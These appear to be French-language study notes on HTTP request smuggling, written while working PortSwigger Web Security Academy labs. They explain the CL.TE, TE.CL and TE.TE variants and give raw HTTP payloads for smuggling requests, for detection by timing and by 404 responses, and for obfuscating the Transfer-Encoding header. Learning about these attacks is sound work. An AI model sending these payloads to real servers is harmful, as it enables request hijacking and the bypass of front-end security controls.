Arrive à cause d'une différence de traitement du flux HTTP entre le frontend et backend sur la longueur d'une requête.
Utiliser `Content-Length` et `Transfer-Encoding` conjointement.
**Essayer sur tous les endpoints, pourrait router vers différent backend**

* CL.TE
* TE.CL
* TE.TE les 2 côtés supportent TE mais un des 2 peut ne pas le traiter and obfuscant l'en-tête.

### RFC 2616
```
If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.
```


## Transfer-Encoding: chunked
Permet d'envoyer des messages en morceaux  avec le format:
* `\r\n`
* nombre d'octets en hexa du chunk `\r\n`
* le chunk (peut-être sur plusieurs lignes mais ne pas compte le dernier `\r\n`)
* `\r\n0\r\n\r\n`
```
POST / HTTP/1.1
Host: 0a3c00cb0488b9e287753a3300110082.web-security-academy.net
Transfer-Encoding: chunked

11
blablablablaccccc
0

```
## Exploit
### CL.TE
1. le frontend traite 13 octets et passe donc tout le message
2. le backend traite en "chunk" et donc jusqu'au 2eme `\r\n` après le 0
3. Il reste donc `SMUGGLED` dans le buffer du backend pour la prochaine requête
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
1. Le frontend traite le chunk et passe donc tout le message
2. Le backend traite les 4 premiers octets
3. Il reste `SMUGGLEDCRAPEATIT\r\n0\r\n\r\n` dans le buffer du backend pour la prochaine requête

```
POST / HTTP/1.1
Host: 0a9600db047b88e083ab4b36001a0037.web-security-academy.net
content-length: 4
Transfer-Encoding: chunked

11
SMUGGLEDCRAPEATIT
0

```

#### Passer une requête
la 2eme requête doit avec un **CL dépassant tous les \\r\\n**, ce qui force le backend à attendre une prochaine requête pour la traiter et la compléter
```
POST / HTTP/1.1
Host: 0a9a00db04acf57989b122e300fb00ab.web-security-academy.net
Content-Length: 4
Transfer-Encoding: chunked

6c
POST / HTTP/1.1
Host: 0a9a00db04acf57989b122e300fb00ab.web-security-academy.net
Content-Length: 11

x=1
0

```
### TE.TE
Doit essayer de forcer une des 2 parties à ignorer TE pour se rabattre sur l'autre option. et utiliser une autre des techniques précédentes.
```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

## Détection
### Par délai
Envoyer une requête non complète dans la 2eme ce qui cause un délai
#### CL.TE
1. Le frontend traite les 4 premiers octets (Omettant le X)
2. Le backend ne reçoit pas de 0 et attend donc la fin
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```
#### TE.CL
1. le frontend traite le premier chunk et donc omet le X
2. le backend attend plus venant de CL
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```
### Par différentiel de réponse
Envoyer un URL invalide dans la requête passé en douce pour recevoir un 404.
#### CL.TE
Les 2 dernière lignes seront  devant la prochaine requête et comme l'URL est invalide, une erreur 404 sera retourné
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```
#### TE.CL
La requête, du GET au 0 seront devant la prochaine requête. un URL invalide  s'y trouvant un 404 est retourné.
```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 144

x=
0
```